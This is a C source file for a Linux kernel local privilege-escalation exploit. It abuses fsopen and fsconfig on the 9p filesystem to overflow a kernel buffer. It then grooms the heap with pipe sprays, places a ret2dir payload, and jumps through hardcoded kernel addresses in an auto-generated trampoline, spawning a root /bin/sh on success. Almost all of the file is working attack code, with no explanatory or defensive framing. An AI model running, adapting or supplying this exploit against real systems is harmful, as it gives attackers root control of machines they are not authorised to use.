#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <assert.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/resource.h>

#include "libexp.h"

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)

/******************************************************************/
/*************************AUTO GENERATED***************************/
#define _GNU_SOURCE
#ifndef va_start
#include <stdarg.h>
#endif
#ifndef assert
#include <assert.h>
#endif
#ifndef signal
#include <signal.h>
#endif
#ifndef sched_setaffinity
#include <sched.h>
#endif

// we need this because rcx may not be restored in the trampoline
// so it will crash during kernel-user switch
void get_shell(int signum) {
    printf("uid: %d\n", getuid());
    system("/bin/sh");
    while(1);
}

void __attribute__((constructor)) _ret2reg_init() {
    signal(SIGSEGV, get_shell);
}

unsigned long _args[6];
unsigned long _arg_num = 0;
void __trigger()
{

    __asm__(".intel_syntax noprefix;"
            "push rbp;"

            "mov rcx, %0;"
            "mov rdi, [rcx+8*0];"
            "mov rsi, [rcx+8*1];"
            "mov rdx, [rcx+8*2];"
            "mov r10, [rcx+8*3];"
            "mov r8, [rcx+8*4];"
            "mov r9, [rcx+8*5];"

                        "mov rbp, 0xffffffff81000737;"
                        "mov rbx, 0xffffffff82e53590;"
                        "mov r10, 0xffffffff810e1de0;"
                        "mov r9, 0xffffffff81e00100;"

            "mov rax, 0;"
            "syscall;"
            "pop rbp;"
            ".att_syntax;"
            : : "r"(_args));
}

void _trigger(int num_args, ...)
{
    va_list ap;
    va_start(ap, num_args);
    for(int i=0; i<num_args; i++) {
        _args[_arg_num++] = va_arg(ap, unsigned long);
    }
    va_arg(ap, unsigned long);
    va_end(ap);

    __asm__(".intel_syntax noprefix;"
            "call __trigger;"
            ".att_syntax;");
    _arg_num = 0;
    if(getuid() == 0) get_shell(0);
}

#define NUMARGS(...)  (sizeof((unsigned long[]){__VA_ARGS__})/sizeof(unsigned long))
#define ret2reg_trigger(...) _trigger(NUMARGS(__VA_ARGS__), __VA_ARGS__ )
/*************************AUTO GENERATED***************************/
/******************************************************************/


#define SPRAY_NUM 0x80
#define CRASH_ADDR 0xffffffff81665daf
char payload[0x1000];
int pipe_fds[SPRAY_NUM][2];
int oob_fd;

void increase_limit()
{
	int ret;
	struct rlimit open_file_limit;

	/* Query current soft/hard value */
	ret = getrlimit(RLIMIT_NOFILE, &open_file_limit);
	assert(ret >= 0);
	
	/* Set soft limit to hard limit */
	open_file_limit.rlim_cur = open_file_limit.rlim_max;
	ret = setrlimit(RLIMIT_NOFILE, &open_file_limit);
	assert(ret >= 0);
}

void context_setup()
{
	oob_fd = fsopen("9p", 0);
	assert(oob_fd >= 0);
}

void payload_setup()
{
	memset(payload, 'B', 0x10);

	void *addr = umem_alloc(NULL, 0x1000);
	u64 *ptr = (u64 *)addr;
	for(int i=0; i<0x10; i++) ptr[i] = CRASH_ADDR;
	u64 kptr = ret2dir_setup(addr, 0xffff888000000000);
	// printf("kptr: %#llx\n", kptr);

	*(u64 *)&payload[0x10] = kptr+0x10;
}

void exploit()
{
	int ret;

	// heap grooming
	for(int i=0; i<SPRAY_NUM; i++) {
		printf("%d\n", i);
		ret = pipe(pipe_fds[i]);
		assert(ret == 0);
		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, 0x34*0x1000);
		assert(ret > 0);
	}
	for(int i=0; i<SPRAY_NUM; i+=8) {
	 	close(pipe_fds[i][1]);
	 }
	for(int i=0; i<SPRAY_NUM; i++) {
		write(pipe_fds[i][1], "A", 1);
	 }

	// place the vulnerable object and overflow
	char val[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	for (int i = 0; i < 117; i++) {
		fsconfig(oob_fd, FSCONFIG_SET_STRING, "\x00", val, 0);
	}
	fsconfig(oob_fd, FSCONFIG_SET_STRING, payload, "\x00", 0);

	// trigger
	for(int i=0; i<SPRAY_NUM; i++) {
		// printf("write: i: %d, ret: %d\n", i, ret);
		// read(pipe_fds[i][0], NULL, 1);
		ret2reg_trigger(pipe_fds[i][0], NULL, 1);
		// int var;
		// ioctl(pipe_fds[i][0], FIONREAD, &var);
		// lseek(pipe_fds[i][0], 0, 0);
		// printf("read: i: %d, ret: %d\n", i, ret);
	}
}

int main(void)
{
	setup_sandbox();
	increase_limit();

	context_setup();
	payload_setup();
	exploit();

	puts("Done");
	getchar();
	return 0;
}
